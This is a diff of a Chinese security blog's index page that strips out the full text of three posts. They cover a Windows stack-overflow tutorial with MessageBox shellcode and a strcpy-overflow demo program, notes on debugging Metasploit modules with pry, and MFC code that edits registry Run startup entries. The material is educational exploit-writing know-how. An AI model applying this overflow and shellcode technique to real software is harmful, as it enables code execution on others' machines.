636B6564</div><div class="line">68 6E206861</div><div class="line">68 20626565</div><div class="line">68 68617665</div><div class="line">68 796F7520</div><div class="line">8BCC</div><div class="line">53</div><div class="line">50</div><div class="line">51</div><div class="line">53</div><div class="line">B8 99EA1A76</div><div class="line">FFD0</div><div class="line">53</div><div class="line">B8 52BE0077</div><div class="line">FFD0</div></pre></td></tr></table></figure></p>
-<p>所以对应的shellcode是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">&quot;\x83\xEC\x50&quot;</div><div class="line">  &quot;\x33\xDB&quot;</div><div class="line">  &quot;\x53&quot;</div><div class="line">  &quot;\x68\x69\x6E\x67\x20&quot;</div><div class="line">  &quot;\x68\x57\x61\x72\x6E&quot;</div><div class="line">  &quot;\x8B\xC4&quot;</div><div class="line">  &quot;\x53&quot;</div><div class="line">  &quot;\x68\x21\x20\x20\x20&quot;</div><div class="line">  &quot;\x68\x4D\x30\x72\x6B&quot;</div><div class="line">  &quot;\x68\x20\x62\x79\x20&quot;</div><div class="line">  &quot;\x68\x63\x6B\x65\x64&quot;</div><div class="line">  &quot;\x68\x6E\x20\x68\x61&quot;</div><div class="line">  &quot;\x68\x20\x62\x65\x65&quot;</div><div class="line">  &quot;\x68\x68\x61\x76\x65&quot;</div><div class="line">  &quot;\x68\x79\x6F\x75\x20&quot;</div><div class="line">  &quot;\x8B\xCC&quot;</div><div class="line">  &quot;\x53&quot;</div><div class="line">  &quot;\x50&quot;</div><div class="line">  &quot;\x51&quot;</div><div class="line">  &quot;\x53&quot;</div><div class="line">  &quot;\xB8\x99\xEA\xF0\x75&quot;</div><div class="line">  &quot;\xFF\xD0&quot;</div><div class="line">  &quot;\x53&quot;</div><div class="line">  &quot;\xB8\x52\xBE\xC0\x76&quot;</div><div class="line">  &quot;\xFF\xD0&quot;;</div></pre></td></tr></table></figure></p>
-<h4 id="利用代码"><a href="#利用代码" class="headerlink" title="利用代码"></a>利用代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">#include &quot;windows.h&quot;</div><div class="line">#include &quot;stdio.h&quot;</div><div class="line">#include &quot;string.h&quot;</div><div class="line"></div><div class="line">char name[] = &quot;\x41\x41\x41\x41\x41\x41\x41\x41&quot;</div><div class="line">              &quot;\x41\x41\x41\x41&quot;   //ebp</div><div class="line">			  &quot;\xb3\xa0\xf6\x75&quot;   //Return address \xb3\xa0\x20\x76</div><div class="line">			  &quot;\x83\xEC\x50&quot;</div><div class="line">			  &quot;\x33\xDB&quot;</div><div class="line">			  &quot;\x53&quot;</div><div class="line">			  &quot;\x68\x69\x6E\x67\x20&quot;</div><div class="line">			  &quot;\x68\x57\x61\x72\x6E&quot;</div><div class="line">			  &quot;\x8B\xC4&quot;</div><div class="line">			  &quot;\x53&quot;</div><div class="line">			  &quot;\x68\x21\x20\x20\x20&quot;</div><div class="line">			  &quot;\x68\x4D\x30\x72\x6B&quot;</div><div class="line">			  &quot;\x68\x20\x62\x79\x20&quot;</div><div class="line">			  &quot;\x68\x63\x6B\x65\x64&quot;</div><div class="line">			  &quot;\x68\x6E\x20\x68\x61&quot;</div><div class="line">			  &quot;\x68\x20\x62\x65\x65&quot;</div><div class="line">			  &quot;\x68\x68\x61\x76\x65&quot;</div><div class="line">			  &quot;\x68\x79\x6F\x75\x20&quot;</div><div class="line">			  &quot;\x8B\xCC&quot;</div><div class="line">			  &quot;\x53&quot;</div><div class="line">			  &quot;\x50&quot;</div><div class="line">			  &quot;\x51&quot;</div><div class="line">			  &quot;\x53&quot;</div><div class="line">			  &quot;\xB8\x99\xEA\xF0\x75&quot;</div><div class="line">			  &quot;\xFF\xD0&quot;</div><div class="line">			  &quot;\x53&quot;</div><div class="line">			  &quot;\xB8\x52\xBE\xC0\x76&quot;</div><div class="line">			  &quot;\xFF\xD0&quot;;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	char buffer[8];</div><div class="line">	LoadLibrary(&quot;user32.dll&quot;);</div><div class="line">	strcpy(buffer,name);</div><div class="line">	printf(&quot;%s\n&quot;,buffer);</div><div class="line">	getchar();</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p><img src="/2017/08/02/windows栈溢出入门/1.png" alt=""></p>
-<h4 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h4><ul>
-<li><a href="http://bbs.pediy.com/search-_E5_8E_9F_E5_88_9B_5DOllyDBG_20_E5_85_A5_E9_97_A8_E7_B3_BB_E5_88_97.htm" target="_blank" rel="external">OllyDBG 入门系列</a><br><a href="http://blog.csdn.net/niexinming/article/details/78144301" target="_blank" rel="external">覆盖虚表方式利用栈溢出漏洞</a><h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4></li>
-<li><a href="https://www.youtube.com/watch?v=aEZKGW_VTd4" target="_blank" rel="external">Hacker Course Buffer Overflow - A Practical Example</a></li>
-</ul>
-
-          
+          概念知识点
+在程序执行的过程中，cpu会不断处理数据，而cpu处理的数据通常来自3个地方1.数据在指令中直接给出2.数据在寄存器中3.数据在内存中漏洞利用原理简介本次实例中的windows缓冲区溢出的原理还是比较简单的，首先使用jmp esp覆盖函数的返回地址，然后esp此时存放的正是shellco
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/08/02/windows栈溢出入门/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1167,7 +1451,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">
+          <h2 class="post-title" itemprop="name headline">
             
             
               
@@ -1177,11 +1461,21 @@
                 </a>
               
             
-          </h1>
+          </h2>
         
 
         <div class="post-meta">
           <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-07-26T19:18:53+08:00">
+                2017-07-26
+              </time>
             
 
             
@@ -1201,6 +1495,37 @@
           
 
           
+            <div class="post-wordcount">
+              
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
 
           
           
@@ -1216,27 +1541,16 @@
       
         
           
-            <p>记录下踩的坑吧</p>
-<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>Ruby是什么，gem又是什么，Ruby on Rails又是什么，之前只是知道Ruby是一门面向对象的脚本语言，gem是有一个ruby的包管理器，好比是python的pip以及nodejs的NPM，而Ruby on Rails是一个使用Ruby语言写的开源Web应用框架，它是严格按照MVC结构开发的。它努力使自身保持简单，来使实际的应用开发时的代码更少，使用最少的配置。(据说Twitter就是用的这个框架)</p>
-<h4 id="Gem使用"><a href="#Gem使用" class="headerlink" title="Gem使用"></a>Gem使用</h4><p>Gem 是一个管理 Ruby 库和程序的标准包。Ruby gem 包的安装方式：<br>所有的 gem 包，会被安装到 /[Ruby root]/lib/ruby/gems/[ver]/ 目录下，这其中包括了 Cache、doc、gems、specifications 等目录，cache 下放置下载的原生 gem 包，gems 下则放置的是解压过的 gem 包。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"> M0rk@hhh  ~/.rvm/rubies/ruby-2.3.0/lib/ruby/gems/2.3.0  ls</div><div class="line">bin            build_info     cache          doc            environment    extensions     gems           specifications wrappers</div></pre></td></tr></table></figure></p>
-<p>当安装过程中遇到问题时，可以进入这些目录，手动删除有问题的 gem 包，然后重新运行 gem install [gemname] 命令即可。<br>Ruby Gem 命令详解：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"># 更新Gem自身</div><div class="line"># 注意：在某些linux发行版中为了系统稳定性此命令禁止执行</div><div class="line">$ gem update --system</div><div class="line"></div><div class="line"># 从Gem源安装gem包</div><div class="line">$ gem install [gemname]</div><div class="line"></div><div class="line"># 从本机安装gem包</div><div class="line">$ gem install -l [gemname].gem</div><div class="line"></div><div class="line"># 安装指定版本的gem包</div><div class="line">$ gem install [gemname] --version=[ver]</div><div class="line"></div><div class="line"># 更新所有已安装的gem包</div><div class="line">$ gem update</div><div class="line"></div><div class="line"># 更新指定的gem包</div><div class="line"># 注意：gem update [gemname]不会升级旧版本的包，此时你可以使用 gem install [gemname] --version=[ver]代替</div><div class="line">$ gem update [gemname]</div><div class="line"></div><div class="line"># 删除指定的gem包，注意此命令将删除所有已安装的版本</div><div class="line">$ gem uninstall [gemname]</div><div class="line"></div><div class="line"># 删除某指定版本gem</div><div class="line">$ gem uninstall [gemname] --version=[ver]</div><div class="line"></div><div class="line"># 查看本机已安装的所有gem包</div><div class="line">$ gem list [--local]</div></pre></td></tr></table></figure>
-<h4 id="踩坑开始"><a href="#踩坑开始" class="headerlink" title="踩坑开始"></a>踩坑开始</h4><p>开始的时候看的是这篇文章<br><a href="https://community.rapid7.com/community/metasploit/blog/2014/03/14/debugging-metasploit-modules-with-pry-debugger" target="_blank" rel="external">https://community.rapid7.com/community/metasploit/blog/2014/03/14/debugging-metasploit-modules-with-pry-debugger</a><br>但是在安装的时候报错，没有好的解决方法<br>这个时候我发现了这个<br><a href="https://github.com/deivid-rodriguez/byebug" target="_blank" rel="external">https://github.com/deivid-rodriguez/byebug</a><br>感觉应该是相同用途，安装没报错，然后修改rb的时候一直加载不了，这个时候想到自己有安装RubyMine，那就测试个helloworld试试看。测试的没问题，如下图：<br><img src="/2017/07/26/metasploit调试/1.png" alt=""><br>后来发现，当添加或者修改metasploit的modules的时候，需要使用 reload_all 命令来重新加载所有的模块，但是添加了 require ‘byebug’ 时候还是报错，好像是需要rerun bundle的，rerun的时候又是各种问题，首先ruby版本太低，升级完ruby版本，bundle install的时候没错了，但是运行msfconsole还是失败…完，meatsloit弄坏了，晚上回来， /opt/metasploit-framework/embedded/framework  sudo ./msfupdate 升级了一下又能用了，太晚了，明天再看看吧</p>
-<p>0727更新：<br>今天又看了下资料，发现byebug还是不能用，搜索metasploit debug的资料也是很老的，但是在Stack Overflow发现了这个<a href="https://stackoverflow.com/questions/43882397/debugging-about-the-metasploit-exploit-module" target="_blank" rel="external">https://stackoverflow.com/questions/43882397/debugging-about-the-metasploit-exploit-module</a><br>就试了一下pry，果然可以和metasploit无缝使用。但是蛋疼的是pry没有step和next这种最基本的单步调试功能。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">require ‘pry’ #需要pry库,否则binding.pry就不认识了</div><div class="line">g_a = 1</div><div class="line">g_b = 2</div><div class="line">binding.pry #运行到这句程序就停下来并打开pry让你调试</div></pre></td></tr></table></figure></p>
-<p>随便找个msf的rb脚本，插上上面的代码<br><img src="/2017/07/26/metasploit调试/2.png" alt=""></p>
-<p>pry常用命令：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">cd: 这可不是切换目录的，而是切换类。如”cd Article”会进入Article类中，”Article.all”可直接缩写为”all”</div><div class="line">nesting: cd切来切去如果迷了路，用它可以看当前在哪个类下面。我倒觉得如果名字改为”pwd”会更好。</div><div class="line">ls: 查看一些信息，ls -h查看帮助，ls -m查看实例方法，ls -M查看类方法，ls -p查看private方法。</div><div class="line">show-doc Array#in_groups_of：查看文档。</div><div class="line">show-method -l Array#in_groups_of：查看方法的源代码，-l显示行号。</div><div class="line">edit-method Array#in_groups_of：调出nano来编辑代码，如果是能调出vim就好啦。(后来发现其实很简单，见后面。)</div><div class="line">help：显示帮助</div></pre></td></tr></table></figure>
-<p>rvm 常用命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">RVM是Ruby Version Manager的缩写，是一个命令行工具，它可以让你轻松地安装，管理和使用多个版本的Ruby.不同的rails项目使用等ruby和rails版本不一样的时候，可以使用RVM自由切换。</div><div class="line">1.rvm list 查看所有的ruby版本</div><div class="line">2.rvm current 查看当前的ruby版本</div><div class="line">3.rvm --default use 2.x.x  切换到到版本2.x.xs</div></pre></td></tr></table></figure></p>
-<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>1.pry-debugger在ruby2.0+已不再能使用，所以基本上可以放弃<br>2.pry-byebug 应该是现在在用的，但是我这里bundle install完之后，msfconsole就报错了，暂时问题还没解决，感觉应该是metasploit使用了自带的ruby以及gem的问题<br>3.最终还是选择了没有单步步过功能的pry<br>4.其实python也有这种调试工具，是pdb的模块，感兴趣的可以学习下<br>5.msfconsole居然是一个脚本文件，一开始以为是个二进制程序。。。（当你通过whereis找不到这个文件的时候，就很有可能是个文本文件，find找到，然后file命令看一下）<br>6.metasploit的ruby是自带的，可执行文件在这个目录下 /opt/metasploit-framework/embedded/bin</p>
-<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><ol>
-<li><a href="http://blog.csdn.net/nixawk/article/details/43732835" target="_blank" rel="external">metasploit - debug</a></li>
-<li><a href="http://shashanzhao.com/archives/877.html" target="_blank" rel="external">使用pry调试程序介绍</a></li>
-<li><a href="https://github.com/pry/pry" target="_blank" rel="external">pry</a></li>
-<li><a href="http://www.jianshu.com/p/602db03b6b58" target="_blank" rel="external">如何单步调试ruby代码</a></li>
-<li><a href="http://drops.xmd5.com/static/drops/tips-14408.html" target="_blank" rel="external">乌云文章：Metasploit module开发入门篇</a></li>
-</ol>
-
-          
+          记录下踩的坑吧
+前言Ruby是什么，gem又是什么，Ruby on Rails又是什么，之前只是知道Ruby是一门面向对象的脚本语言，gem是有一个ruby的包管理器，好比是python的pip以及nodejs的NPM，而Ruby on Rails是一个使用Ruby语言写的开源Web应用框架，它是严
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/07/26/metasploit调试/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1295,7 +1609,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">
+          <h2 class="post-title" itemprop="name headline">
             
             
               
@@ -1305,11 +1619,21 @@
                 </a>
               
             
-          </h1>
+          </h2>
         
 
         <div class="post-meta">
           <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-07-24T11:47:22+08:00">
+                2017-07-24
+              </time>
             
 
             
@@ -1329,6 +1653,37 @@
           
 
           
+            <div class="post-wordcount">
+              
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
 
           
           
@@ -1344,82 +1699,15 @@
       
         
           
-            <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;注册表是Microsoft Windows中的一个重要的数据库，用于存储系统和应用程序的设置信息。早在Windows 3.0推出OLE技术的时候，注册表就已经出现。随后推出的Windows NT是第一个从系统级别广泛使用注册表的操作系统。但是，从Windows 95开始，注册表才真正成为Windows用户经常接触的内容，并在其后的操作系统中继续沿用至今。<br>由于注册表的功能非常强大，因此注册表对于病毒、木马来说是非常有利用价值的，而对于反病毒软件来说，注册表也是它需要加强守卫的地方，可以说，注册表是一个正义与邪恶的必争之地。<br>恶意程序在注册表中常见的操作有修改文件关联、增加系统启动项、映像劫持、篡改浏览器主页等。<br><strong>数据结构</strong>:<br>&nbsp;&nbsp;&nbsp;&nbsp;注册表由键（key，或称“项”）、子键（subkey，子项）和值项（value）构成。一个键就是树状数据结构中的一个节点，而子键就是这个节点的子节点，子键也是键。一个值项则是一个键的一条属性，由名称（name）、数据类型（datatype）以及数据（data）组成。一个键可以有一个或多个值，每个值的名称各不相同，如果一个值的名称为空，则该值为该键的默认值。<br><strong>数据类型</strong>:<br>注册表的数据类型主要有以下五种：</p>
-<table>
-<thead>
-<tr>
-<th>显示类型</th>
-<th>数据类型</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>REG_SZ</td>
-<td>字符串</td>
-<td>文本字串</td>
-</tr>
-<tr>
-<td>REG_BINARY</td>
-<td>二进制数</td>
-<td>不定长度的二进制值，以十六进制显示</td>
-</tr>
-<tr>
-<td>REG_DWORD</td>
-<td>双字</td>
-<td>一个 32 位的二进制值，显示为 8 位的十六进制值</td>
-</tr>
-<tr>
-<td>REG_MULTI_SZ</td>
-<td>多字符串</td>
-<td>含有多个文本值的字符串，此名来源于字符串间用 nul 分隔、结尾两个 nul</td>
-</tr>
-<tr>
-<td>REG_EXPAND_SZ</td>
-<td>可扩充字符串</td>
-<td>含有环境变量的字符串</td>
-</tr>
-</tbody>
-</table>
-<p><strong>注册表的分支结构</strong>:<br>注册表有五个一级分支，下面是这五个分支的名称及作用：</p>
-<table>
-<thead>
-<tr>
-<th>名称</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>HKEY_CLASSES_ROOT</td>
-<td>存储Windows可识别的文件类型的详细列表，以及相关联的程序。</td>
-</tr>
-<tr>
-<td>HKEY_CURRENT_USER</td>
-<td>存储当前用户设置的信息。</td>
-</tr>
-<tr>
-<td>HKEY_LOCAL_MACHINE</td>
-<td>包括安装在计算机上的硬件和软件的信息。</td>
-</tr>
-<tr>
-<td>HKEY_USERS</td>
-<td>包含使用计算机的用户的信息。</td>
-</tr>
-<tr>
-<td>HKEY_CURRENT_CONFIG</td>
-<td>这个分支包含计算机当前的硬件配置信息。</td>
-</tr>
-</tbody>
-</table>
-<h4 id="通过注册表获取开机启动项"><a href="#通过注册表获取开机启动项" class="headerlink" title="通过注册表获取开机启动项"></a>通过注册表获取开机启动项</h4><p>原理: 通过枚举注册表中的 “HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\“子键下的键值项,取得跟随windows启动而启动的程序。</p>
-<p>主要代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div></pre></td><td class="code"><pre><div class="line">VOID CManageRunDlg::InitRunList()</div><div class="line">&#123;</div><div class="line">    // 设置扩展样式</div><div class="line">    m_RunList.SetExtendedStyle(</div><div class="line">            m_RunList.GetExtendedStyle()</div><div class="line">            | LVS_EX_GRIDLINES          // 有网格</div><div class="line">            | LVS_EX_FULLROWSELECT);    // 选择单行</div><div class="line"></div><div class="line">    // 在ListCtrl中插入新列</div><div class="line">    m_RunList.InsertColumn(0, &quot;NO.&quot;);</div><div class="line">    m_RunList.InsertColumn(1, &quot;键值名称&quot;);</div><div class="line">    m_RunList.InsertColumn(2, &quot;键    值&quot;);</div><div class="line"></div><div class="line">    /*</div><div class="line">    LVSCW_AUTOSIZE_USEHEADER:</div><div class="line">    列的宽度自动匹配为标题文本</div><div class="line">    如果这个值用在最后一列，列宽被设置为ListCtrl剩余的长度</div><div class="line">    */</div><div class="line">    m_RunList.SetColumnWidth(0, LVSCW_AUTOSIZE_USEHEADER);</div><div class="line">    m_RunList.SetColumnWidth(1, LVSCW_AUTOSIZE_USEHEADER);</div><div class="line">    m_RunList.SetColumnWidth(2, LVSCW_AUTOSIZE_USEHEADER);</div><div class="line">&#125;</div><div class="line"></div><div class="line">#define REG_RUN &quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run\\&quot;</div><div class="line"></div><div class="line">VOID CManageRunDlg::ShowRunList()</div><div class="line">&#123;</div><div class="line">    // 清空ListCtrl中的所有项</div><div class="line">    m_RunList.DeleteAllItems();    </div><div class="line"></div><div class="line">    DWORD dwType = 0;</div><div class="line">    DWORD dwBufferSize = MAXBYTE;</div><div class="line">    DWORD dwKeySize = MAXBYTE;</div><div class="line">    char szValueName[MAXBYTE] = &#123; 0 &#125;;</div><div class="line">    char szValueKey[MAXBYTE] = &#123; 0 &#125;;</div><div class="line"></div><div class="line">    HKEY hKey = NULL;</div><div class="line">    LONG lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, </div><div class="line">            REG_RUN, 0, KEY_ALL_ACCESS, &amp;hKey);</div><div class="line"></div><div class="line">    if ( lRet != ERROR_SUCCESS )</div><div class="line">    &#123;</div><div class="line">        return ;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    int i = 0;</div><div class="line">    CString strTmp;</div><div class="line"></div><div class="line">    while ( TRUE )</div><div class="line">    &#123;</div><div class="line">        // 枚举键项</div><div class="line">        lRet = RegEnumValue(hKey, i, szValueName, </div><div class="line">            &amp;dwBufferSize, NULL, &amp;dwType, </div><div class="line">            (unsigned char *)szValueKey, &amp;dwKeySize);</div><div class="line"></div><div class="line">        // 没有则退出循环</div><div class="line">        if ( lRet == ERROR_NO_MORE_ITEMS )</div><div class="line">        &#123;</div><div class="line">            break;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        // 显示到列表控件中</div><div class="line">        strTmp.Format(&quot;%d&quot;, i);</div><div class="line">        m_RunList.InsertItem(i, strTmp);</div><div class="line">        m_RunList.SetItemText(i, 1, szValueName);</div><div class="line">        m_RunList.SetItemText(i, 2, szValueKey);</div><div class="line"></div><div class="line">        ZeroMemory(szValueKey, MAXBYTE);</div><div class="line">        ZeroMemory(szValueName, MAXBYTE);</div><div class="line"></div><div class="line">        dwBufferSize = MAXBYTE;</div><div class="line">        dwKeySize = MAXBYTE;</div><div class="line"></div><div class="line">        i ++;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    RegCloseKey(hKey);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void CManageRunDlg::OnBtnAdd() </div><div class="line">&#123;</div><div class="line">	// TODO: Add your control notification handler code here</div><div class="line">	CRegAdd RegAdd;</div><div class="line">    RegAdd.DoModal();</div><div class="line"></div><div class="line">    // 判断输入是否完整</div><div class="line">    if ( strlen(RegAdd.m_szKeyName) &gt; 0 &amp;&amp; </div><div class="line">        strlen(RegAdd.m_szKeyValue) &gt; 0)</div><div class="line">    &#123;</div><div class="line">        HKEY hKey = NULL;</div><div class="line">        LONG lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, </div><div class="line">            REG_RUN, 0, KEY_ALL_ACCESS, &amp;hKey);</div><div class="line"></div><div class="line">        if ( lRet != ERROR_SUCCESS )</div><div class="line">        &#123;</div><div class="line">            return ;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        RegSetValueEx(hKey, RegAdd.m_szKeyName, 0, </div><div class="line">            REG_SZ, (const unsigned char*)RegAdd.m_szKeyValue,</div><div class="line">            strlen(RegAdd.m_szKeyValue) + sizeof(char));</div><div class="line"></div><div class="line">        RegCloseKey(hKey);</div><div class="line"></div><div class="line">        ShowRunList();</div><div class="line">    &#125; </div><div class="line">    else</div><div class="line">    &#123;</div><div class="line">        AfxMessageBox(&quot;请输入完整的内容&quot;);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">void CManageRunDlg::OnBtnDel() </div><div class="line">&#123;</div><div class="line">    // TODO: Add your control notification handler code here</div><div class="line">    POSITION pos = m_RunList.GetFirstSelectedItemPosition();</div><div class="line">    int nSelected = -1;</div><div class="line">    </div><div class="line">    while ( pos )</div><div class="line">    &#123;</div><div class="line">        nSelected = m_RunList.GetNextSelectedItem(pos);</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    if ( -1 == nSelected )</div><div class="line">    &#123;</div><div class="line">        AfxMessageBox(&quot;请选择要删除的启动项&quot;);</div><div class="line">        return ;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    char szKeyName[MAXBYTE] = &#123; 0 &#125;;</div><div class="line">    m_RunList.GetItemText(nSelected, 1, szKeyName, MAXBYTE);</div><div class="line">        </div><div class="line">    HKEY hKey = NULL;</div><div class="line">    </div><div class="line">    LONG lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, </div><div class="line">            REG_RUN, 0, KEY_ALL_ACCESS, &amp;hKey);</div><div class="line">    </div><div class="line">    RegDeleteValue(hKey, szKeyName);</div><div class="line">    </div><div class="line">    RegCloseKey(hKey);</div><div class="line">    </div><div class="line">    ShowRunList();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p><img src="/2017/07/24/windows注册表/1.png" alt=""></p>
-<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><ul>
